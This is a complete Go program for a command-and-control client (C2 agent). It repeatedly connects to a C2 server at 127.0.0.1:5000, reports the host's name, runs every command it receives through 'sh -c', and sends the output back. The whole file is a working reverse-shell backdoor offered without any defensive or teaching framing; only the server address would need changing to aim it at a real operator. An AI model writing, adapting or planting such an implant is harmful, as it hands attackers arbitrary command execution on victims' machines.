package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	serverAddr := "127.0.0.1:5000"

	for {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			continue
		}
		fmt.Println("[+] Connected to C2 Server")

		// Send hostname on connect
		hostname, _ := exec.Command("hostname").Output()
		conn.Write([]byte(strings.TrimSpace(string(hostname))))

		handleServer(conn)
	}
}

func handleServer(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		output := executeCommand(command)
		conn.Write([]byte(output))
	}
}

func executeCommand(command string) string {
	cmd := exec.Command("sh", "-c", command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s", err)
	}
	return string(out)
}
